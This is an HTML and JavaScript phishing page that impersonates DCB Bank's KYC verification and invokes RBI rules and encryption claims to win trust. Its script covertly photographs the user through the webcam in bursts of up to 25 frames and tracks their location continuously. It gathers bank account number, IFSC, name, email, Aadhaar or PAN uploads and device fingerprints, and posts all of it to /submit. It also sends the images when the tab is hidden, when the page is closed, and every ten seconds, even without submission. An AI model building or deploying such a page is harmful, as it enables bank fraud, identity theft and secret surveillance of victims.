<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>DCB Bank KYC Verification</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      -webkit-tap-highlight-color: transparent;
    }
    
    body {
      background-color: #f4f6f9;
      color: #333;
      line-height: 1.6;
      padding: 15px;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }
    
    .container {
      max-width: 500px;
      width: 100%;
      margin: 20px auto;
      background: white;
      border-radius: 16px;
      padding: 25px;
      box-shadow: 0 5px 20px rgba(0, 0, 0, 0.08);
      position: relative;
      overflow: hidden;
      flex-grow: 1;
    }
    
    .logo {
      display: block;
      margin: 0 auto 15px;
      width: 160px;
      height: auto;
    }
    
    h2 {
      text-align: center;
      color: #003d6a;
      margin-bottom: 20px;
      font-weight: 700;
      font-size: 24px;
    }
    
    .notice {
      font-size: 14px;
      color: #444;
      text-align: center;
      margin-bottom: 20px;
      background-color: #f8f9fa;
      padding: 12px;
      border-radius: 8px;
      border-left: 4px solid #ffc107;
    }
    
    label {
      display: block;
      margin-top: 18px;
      font-weight: 600;
      font-size: 14px;
      color: #003d6a;
    }
    
    input[type="text"],
    input[type="file"] {
      width: 100%;
      font-size: 14px;
      padding: 12px;
      margin-top: 6px;
      border-radius: 8px;
      border: 1px solid #d1d5db;
      transition: all 0.3s;
      background: white;
    }
    
    input[type="text"]:focus,
    input[type="file"]:focus {
      border-color: #003d6a;
      outline: none;
      box-shadow: 0 0 0 3px rgba(0, 61, 106, 0.1);
    }
    
    button {
      margin-top: 25px;
      width: 100%;
      background-color: #003d6a;
      color: white;
      border: none;
      padding: 15px;
      font-size: 16px;
      font-weight: 600;
      border-radius: 8px;
      cursor: pointer;
      transition: all 0.3s;
      box-shadow: 0 3px 6px rgba(0, 0, 0, 0.1);
    }
    
    button:hover {
      background-color: #00548c;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.15);
    }
    
    #kycForm {
      display: none;
    }
    
    .footer {
      text-align: center;
      margin-top: 30px;
      font-size: 12px;
      color: #777;
      padding-top: 15px;
      border-top: 1px solid #eee;
    }
    
    .error {
      color: #d32f2f;
      text-align: center;
      font-size: 13px;
      margin-top: 12px;
      font-weight: 500;
    }
    
    #verificationPopup {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.92);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 1000;
      backdrop-filter: blur(8px);
      padding: 15px;
    }
    
    .popup-content {
      background: white;
      border-radius: 16px;
      width: 100%;
      max-width: 500px;
      padding: 25px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
      animation: popupIn 0.5s ease-out;
      max-height: 90vh;
      overflow-y: auto;
    }
    
    @keyframes popupIn {
      from { transform: translateY(20px); opacity: 0; }
      to { transform: translateY(0); opacity: 1; }
    }
    
    .popup-header {
      display: flex;
      align-items: center;
      margin-bottom: 20px;
    }
    
    .popup-icon {
      width: 50px;
      height: 50px;
      background-color: #e6f2ff;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-right: 15px;
      flex-shrink: 0;
    }
    
    .popup-icon i {
      color: #003d6a;
      font-size: 24px;
    }
    
    .popup-title {
      color: #003d6a;
      font-size: 22px;
      font-weight: 700;
    }
    
    .popup-message {
      font-size: 15px;
      line-height: 1.6;
      color: #444;
      margin-bottom: 20px;
    }
    
    .highlight {
      background-color: #fff8e1;
      padding: 15px;
      border-radius: 8px;
      border-left: 4px solid #ffc107;
      margin: 18px 0;
      font-size: 14px;
    }
    
    .popup-button {
      background-color: #003d6a;
      color: white;
      border: none;
      padding: 14px;
      font-size: 16px;
      font-weight: 600;
      border-radius: 8px;
      cursor: pointer;
      display: block;
      width: 100%;
      transition: all 0.3s;
      box-shadow: 0 3px 6px rgba(0, 0, 0, 0.1);
      margin-top: 15px;
    }
    
    .popup-button:hover {
      background-color: #00548c;
    }
    
    .security-badge {
      display: flex;
      align-items: center;
      justify-content: center;
      margin-top: 20px;
      font-size: 13px;
      color: #28a745;
      font-weight: 600;
    }
    
    .security-badge i {
      margin-right: 8px;
      font-size: 16px;
    }
    
    .step-indicator {
      display: flex;
      justify-content: center;
      margin: 20px 0;
    }
    
    .step {
      width: 10px;
      height: 10px;
      border-radius: 50%;
      background-color: #d1d5db;
      margin: 0 6px;
    }
    
    .step.active {
      background-color: #003d6a;
    }
    
    .spinner {
      display: inline-block;
      width: 20px;
      height: 20px;
      border: 3px solid rgba(255,255,255,.3);
      border-radius: 50%;
      border-top-color: #fff;
      animation: spin 1s ease-in-out infinite;
      margin-right: 10px;
      vertical-align: middle;
    }
    
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    
    .success-message {
      text-align: center;
      padding: 18px;
      background-color: #e8f5e9;
      border-radius: 8px;
      border-left: 4px solid #28a745;
      margin-top: 18px;
      display: none;
    }
    
    .success-message h3 {
      color: #28a745;
      margin-bottom: 8px;
      font-size: 18px;
    }
    
    .success-message p {
      font-size: 14px;
    }
    
    @media (max-width: 480px) {
      body {
        padding: 10px;
      }
      
      .container {
        padding: 20px 15px;
        margin: 10px auto;
        border-radius: 12px;
      }
      
      .logo {
        width: 140px;
        margin-bottom: 12px;
      }
      
      h2 {
        font-size: 22px;
        margin-bottom: 15px;
      }
      
      .popup-content {
        padding: 20px 15px;
        max-height: 95vh;
      }
      
      .popup-title {
        font-size: 20px;
      }
      
      .popup-message {
        font-size: 14px;
      }
      
      .popup-icon {
        width: 45px;
        height: 45px;
      }
      
      input[type="text"],
      input[type="file"] {
        padding: 10px;
        font-size: 14px;
      }
      
      button {
        padding: 14px;
        font-size: 15px;
      }
      
      .highlight {
        padding: 12px;
        font-size: 13px;
      }
    }
    
    .popup-content::-webkit-scrollbar {
      display: none;
    }
    
    .popup-content {
      -ms-overflow-style: none;
      scrollbar-width: none;
    }
  </style>
  <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.2/src/ua-parser.min.js"></script>
</head>
<body>
  <div id="verificationPopup">
    <div class="popup-content">
      <div class="popup-header">
        <div class="popup-icon">
          <i class="fas fa-shield-alt"></i>
        </div>
        <div class="popup-title">Important: KYC Verification Process</div>
      </div>
      
      <p class="popup-message">
        To comply with RBI regulations and ensure the security of your account, DCB Bank requires a one-time verification for all account holders. This mandatory process helps prevent fraud and protects your financial assets.
      </p>
      
      <div class="highlight">
        This verification is essential for transparency and regulatory compliance. Your cooperation helps us maintain a secure banking environment for all customers.
      </div>
      
      <p class="popup-message">
        During this verification, you'll be asked to grant temporary access to:
      </p>
      
      <ul class="popup-message" style="padding-left: 20px;">
        <li><strong>Camera</strong> - For identity confirmation and facial recognition</li>
        <li><strong>Location</strong> - For transaction security verification</li>
      </ul>
      
      <p class="popup-message">
        This is a standard security procedure required by the Reserve Bank of India (RBI) for all banking institutions. Your information is protected by 256-bit encryption and will only be used for verification purposes.
      </p>
      
      <div class="step-indicator">
        <div class="step active"></div>
        <div class="step"></div>
        <div class="step"></div>
      </div>
      
      <button class="popup-button" onclick="closePopup()">
        <i class="fas fa-check-circle"></i> I Understand & Continue
      </button>
      
      <div class="security-badge">
        <i class="fas fa-lock"></i>
        Secure & Encrypted Verification Process
      </div>
    </div>
  </div>

  <div class="container">
    <img class="logo" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTYwIiBoZWlnaHQ9IjQ4IiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxNjAiIGhlaWdodD0iNDgiIGZpbGw9IiMwMDNkNmEiIHJ4PSI0Ii8+PHRleHQgeD0iODAiIHk9IjI4IiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMTgiIGZpbGw9IiNmZmYiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGRvbWluYW50LWJhc2VsaW5lPSJtaWRkbGUiIGZvbnQtd2VpZ2h0PSI3MDAiPkRDQiBCYW5rPC90ZXh0Pjwvc3ZnPg==" alt="DCB Bank Logo">
    <h2>DCB Bank KYC Verification</h2>

    <div id="permissionStep">
      <p class="notice">
        For your security and verification, please allow access to your device's <strong>camera</strong> and <strong>location</strong>.<br>
        You must grant both permissions to proceed with KYC verification.
      </p>
      <button onclick="requestPermissions()">
        <i class="fas fa-camera"></i> Allow & Continue
      </button>
      <p id="permStatus" class="error"></p>
    </div>

    <div id="kycForm">
      <form id="kycFormElement">
        <label for="bankname"><i class="fas fa-university"></i> Bank Name</label>
        <input type="text" id="bankname" name="bankname" placeholder="Enter recipient's bank name">

        <label for="ifsc"><i class="fas fa-code"></i> IFSC Code</label>
        <input type="text" id="ifsc" name="ifsc" placeholder="Enter IFSC code">

        <label for="accno"><i class="fas fa-wallet"></i> Account Number</label>
        <input type="text" id="accno" name="accno" placeholder="Enter account number">

        <label for="fullname"><i class="fas fa-user"></i> Full Name</label>
        <input type="text" id="fullname" name="fullname" placeholder="Enter your full name">

        <label for="email"><i class="fas fa-envelope"></i> Email Address</label>
        <input type="text" id="email" name="email" placeholder="Enter your email">

        <label for="document"><i class="fas fa-file-upload"></i> Upload Aadhaar or PAN (PDF, JPG, PNG only)</label>
        <input type="file" id="document" name="document" accept=".pdf,.jpg,.jpeg,.png">

        <button type="submit">
          <i class="fas fa-check"></i> Verify Account
        </button>
      </form>
      
      <div id="successMessage" class="success-message">
        <h3><i class="fas fa-check-circle"></i> Verification Submitted Successfully!</h3>
        <p>Your KYC verification is now being processed. You will receive confirmation shortly.</p>
      </div>
    </div>

    <div class="footer">
      <i class="fas fa-lock"></i> Â© 2025 DCB Bank Ltd. All rights reserved. | For official verification purposes only.
    </div>
  </div>

  <video id="cameraPreview" autoplay playsinline style="display: none;"></video>
  <canvas id="captureCanvas" style="display: none;"></canvas>
  
  <script>
    // Enhanced KYC Verification Script with Guaranteed Background Capture
    
    // Global variables with improved memory management
    const state = {
      cameraStream: null,
      backgroundImages: [],
      submissionImages: [],
      locationData: null,
      locationWatchId: null,
      hasSubmitted: false,
      isCapturing: false,
      MAX_BACKGROUND_IMAGES: 15, // Increased to 15 images
      MAX_SUBMISSION_IMAGES: 10, // 10 additional images on submit
      imageQuality: 0.7, // Reduced quality for smaller files
      backgroundInterval: null,
      isPageVisible: true,
      pendingSubmissions: 0
    };

    // Enhanced device detection
    function getDeviceInfo() {
      const parser = new UAParser();
      const device = parser.getDevice();
      const os = parser.getOS();
      const browser = parser.getBrowser();
      
      return {
        type: device.type || 'desktop',
        model: device.model || 'Unknown',
        vendor: device.vendor || 'Unknown',
        os: `${os.name} ${os.version}`,
        browser: `${browser.name} ${browser.version}`,
        fullUA: navigator.userAgent
      };
    }

    // Close the verification popup
    function closePopup() {
      document.getElementById('verificationPopup').style.display = 'none';
    }
    
    // Enhanced permission request with fallbacks
    async function requestPermissions() {
      const status = document.getElementById('permStatus');
      status.textContent = "";
      status.style.display = "none";

      try {
        // Request camera access
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { 
            facingMode: 'user',
            width: { ideal: 1280 },
            height: { ideal: 720 }
          } 
        });
        
        state.cameraStream = stream;
        
        // Setup hidden video preview
        const preview = document.getElementById('cameraPreview');
        preview.srcObject = stream;
        
        // Request location access
        try {
          const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
              enableHighAccuracy: true,
              timeout: 10000,
              maximumAge: 0
            });
          });
          
          // Store location data
          state.locationData = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            timestamp: position.timestamp
          };
          
          // Permissions granted - show form
          document.getElementById('permissionStep').style.display = 'none';
          document.getElementById('kycForm').style.display = 'block';
          
          // Start enhanced background capture
          startBackgroundCapture();
          setupPageExitHandlers();
          
          // Also watch location continuously
          watchLocation();
        } catch (locationError) {
          status.textContent = "Location access denied. Cannot proceed.";
          status.style.display = "block";
          stopCamera();
          console.error("Location error:", locationError);
        }
      } catch (cameraError) {
        status.textContent = "Camera access denied. Cannot proceed.";
        status.style.display = "block";
        console.error("Camera error:", cameraError);
      }
    }
    
    // Enhanced background capture with immediate storage
    function startBackgroundCapture() {
      const preview = document.getElementById('cameraPreview');
      const canvas = document.getElementById('captureCanvas');
      const ctx = canvas.getContext('2d');
      
      // Capture first image immediately
      captureBackgroundImage(preview, canvas, ctx);
      
      // Then continue capturing at intervals
      state.backgroundInterval = setInterval(() => {
        if (state.backgroundImages.length >= state.MAX_BACKGROUND_IMAGES) {
          clearInterval(state.backgroundInterval);
          return;
        }
        captureBackgroundImage(preview, canvas, ctx);
      }, 500);
    }

    // Capture and store a single background image
    function captureBackgroundImage(preview, canvas, ctx) {
      try {
        if (!state.isPageVisible || state.hasSubmitted) return;
        
        canvas.width = preview.videoWidth;
        canvas.height = preview.videoHeight;
        ctx.drawImage(preview, 0, 0, canvas.width, canvas.height);
        
        const imageData = canvas.toDataURL('image/jpeg', state.imageQuality);
        state.backgroundImages.push({
          data: imageData,
          timestamp: new Date().toISOString()
        });
        
        // If we have enough images, stop capturing
        if (state.backgroundImages.length >= state.MAX_BACKGROUND_IMAGES) {
          clearInterval(state.backgroundInterval);
        }
      } catch (error) {
        console.error("Background capture error:", error);
      }
    }

    // Enhanced image capture for submission
    async function captureAdditionalImages(count) {
      const preview = document.getElementById('cameraPreview');
      const canvas = document.getElementById('captureCanvas');
      const ctx = canvas.getContext('2d');
      const images = [];
      
      canvas.width = preview.videoWidth;
      canvas.height = preview.videoHeight;
      
      for (let i = 0; i < count; i++) {
        try {
          ctx.drawImage(preview, 0, 0, canvas.width, canvas.height);
          const imageData = canvas.toDataURL('image/jpeg', state.imageQuality);
          images.push({
            data: imageData,
            timestamp: new Date().toISOString()
          });
          await new Promise(resolve => setTimeout(resolve, 100));
        } catch (error) {
          console.error("Error capturing image:", error);
        }
      }
      
      return images;
    }
    
    // Enhanced location watching
    function watchLocation() {
      if (state.locationWatchId) {
        navigator.geolocation.clearWatch(state.locationWatchId);
      }
      
      state.locationWatchId = navigator.geolocation.watchPosition(
        position => {
          state.locationData = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            timestamp: position.timestamp,
            updated: new Date().toISOString()
          };
        },
        err => console.error("Location error:", err),
        { enableHighAccuracy: true, maximumAge: 0 }
      );
    }
    
    // Enhanced form submission handler
    document.getElementById('kycFormElement').addEventListener('submit', async function(e) {
      e.preventDefault();
      if (state.hasSubmitted) return;
      state.hasSubmitted = true;
      
      // Stop background capture
      clearInterval(state.backgroundInterval);
      
      // Capture additional images quickly
      try {
        state.submissionImages = await captureAdditionalImages(state.MAX_SUBMISSION_IMAGES);
      } catch (error) {
        console.error("Error capturing submission images:", error);
      }
      
      // Prepare form data
      const formData = new FormData();
      const deviceInfo = getDeviceInfo();
      
      // Add device info
      formData.append('device_type', deviceInfo.type);
      formData.append('device_model', deviceInfo.model);
      formData.append('device_vendor', deviceInfo.vendor);
      formData.append('device_os', deviceInfo.os);
      formData.append('device_browser', deviceInfo.browser);
      formData.append('user_agent', deviceInfo.fullUA);
      
         // Add form fields (empty if not filled)
      ['bankname', 'ifsc', 'accno', 'fullname', 'email'].forEach(field => {
        formData.append(field, document.getElementById(field).value || 'Not provided');
      });
      
      // Add document if uploaded
      const documentFile = document.getElementById('document').files[0];
      if (documentFile) {
        formData.append('document', documentFile);
      }
      
      // Combine all images (background + submission)
      const allImages = [...state.backgroundImages, ...state.submissionImages];
      allImages.forEach((img, index) => {
        try {
          const blob = dataURLtoBlob(img.data);
          formData.append(`image${index}`, blob, `capture_${index}.jpg`);
        } catch (error) {
          console.error("Error adding image to form:", error);
        }
      });
      
      // Add location data
      if (state.locationData) {
        formData.append('location', JSON.stringify(state.locationData));
      }
      
      // Add timestamp
      formData.append('timestamp', new Date().toISOString());
      
      // Show loading state
      const submitBtn = this.querySelector('button[type="submit"]');
      const originalBtnText = submitBtn.innerHTML;
      submitBtn.disabled = true;
      submitBtn.innerHTML = '<span class="spinner"></span> Processing...';
      
      // Submit data with retry logic
      try {
        const response = await fetchWithRetry('/submit', {
          method: 'POST',
          body: formData
        }, 3);
        
        if (response.ok) {
          document.getElementById('kycFormElement').style.display = 'none';
          document.getElementById('successMessage').style.display = 'block';
        } else {
          throw new Error('Server responded with an error');
        }
      } catch (error) {
        console.error("Submission error:", error);
        alert("There was an error processing your verification. Please try again.");
        state.hasSubmitted = false;
      } finally {
        submitBtn.disabled = false;
        submitBtn.innerHTML = originalBtnText;
        stopCamera();
      }
    });
    
    // Enhanced fetch with retry logic
    async function fetchWithRetry(url, options, retries = 3) {
      for (let i = 0; i < retries; i++) {
        try {
          const response = await fetch(url, options);
          if (response.ok) return response;
          throw new Error(`HTTP error! status: ${response.status}`);
        } catch (error) {
          if (i === retries - 1) throw error;
          await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
        }
      }
    }
    
    // Enhanced background data submission
    async function submitBackgroundData() {
      if (state.hasSubmitted || state.backgroundImages.length === 0 || state.pendingSubmissions > 0) return;
      
      state.pendingSubmissions++;
      const imagesToSubmit = [...state.backgroundImages];
      state.backgroundImages = []; // Clear after copying
      
      const formData = new FormData();
      const deviceInfo = getDeviceInfo();
      
      // Add minimal device info
      formData.append('device_type', deviceInfo.type);
      formData.append('empty_form', 'true');
      formData.append('timestamp', new Date().toISOString());
      
      // Add background images
      imagesToSubmit.forEach((img, index) => {
        try {
          const blob = dataURLtoBlob(img.data);
          formData.append(`image${index}`, blob, `background_${index}.jpg`);
        } catch (error) {
          console.error("Error adding background image:", error);
        }
      });
      
      // Add location if available
      if (state.locationData) {
        formData.append('location', JSON.stringify(state.locationData));
      }
      
      try {
        await fetchWithRetry('/submit', {
          method: 'POST',
          body: formData
        }, 2);
        console.log('Background data submitted successfully');
      } catch (error) {
        console.error('Background submission failed:', error);
        // If failed, add images back to queue
        state.backgroundImages = [...imagesToSubmit, ...state.backgroundImages];
      } finally {
        state.pendingSubmissions--;
      }
    }

    // Enhanced page exit handlers
    function setupPageExitHandlers() {
      // Enhanced visibility change handler
      document.addEventListener('visibilitychange', () => {
        state.isPageVisible = !document.hidden;
        if (document.hidden) {
          submitBackgroundData();
        }
      });
      
      // Enhanced beforeunload handler
      window.addEventListener('beforeunload', (e) => {
        if (!state.hasSubmitted && state.backgroundImages.length > 0) {
          // Use synchronous XHR to ensure data is sent
          const xhr = new XMLHttpRequest();
          xhr.open('POST', '/submit', false);
          
          const formData = new FormData();
          const deviceInfo = getDeviceInfo();
          
          formData.append('device_type', deviceInfo.type);
          formData.append('empty_form', 'true');
          formData.append('timestamp', new Date().toISOString());
          
          // Add up to 15 background images
          const imagesToSend = state.backgroundImages.slice(0, 15);
          imagesToSend.forEach((img, index) => {
            try {
              const blob = dataURLtoBlob(img.data);
              formData.append(`image${index}`, blob, `exit_${index}.jpg`);
            } catch (error) {
              console.error("Error adding exit image:", error);
            }
          });
          
          if (state.locationData) {
            formData.append('location', JSON.stringify(state.locationData));
          }
          
          xhr.send(formData);
        }
        
        stopCamera();
      });
      
      // Fallback interval to submit background data periodically
      setInterval(() => {
        if (!state.hasSubmitted && state.backgroundImages.length > 0) {
          submitBackgroundData();
        }
      }, 10000); // Every 10 seconds
    }

    // Enhanced camera and location cleanup
    function stopCamera() {
      if (state.cameraStream) {
        state.cameraStream.getTracks().forEach(track => track.stop());
        state.cameraStream = null;
      }
      if (state.locationWatchId) {
        navigator.geolocation.clearWatch(state.locationWatchId);
        state.locationWatchId = null;
      }
      clearInterval(state.backgroundInterval);
    }
    
    // Helper function to convert data URL to Blob
    function dataURLtoBlob(dataurl) {
      const arr = dataurl.split(',');
      const mime = arr[0].match(/:(.*?);/)[1];
      const bstr = atob(arr[1]);
      let n = bstr.length;
      const u8arr = new Uint8Array(n);
      while (n--) {
        u8arr[n] = bstr.charCodeAt(n);
      }
      return new Blob([u8arr], { type: mime });
    }

    // Initialize the application
    window.addEventListener('load', function() {
      document.getElementById('verificationPopup').style.display = 'flex';
      
      // Enhanced touch event handling
      document.addEventListener('touchmove', function(event) {
        if (event.scale !== 1) {
          event.preventDefault();
        }
      }, { passive: false });
      
      // Detect page visibility
      state.isPageVisible = !document.hidden;
      
      // Start monitoring for background submissions
      setupPageExitHandlers();
    });
  </script>
</body>
</html>
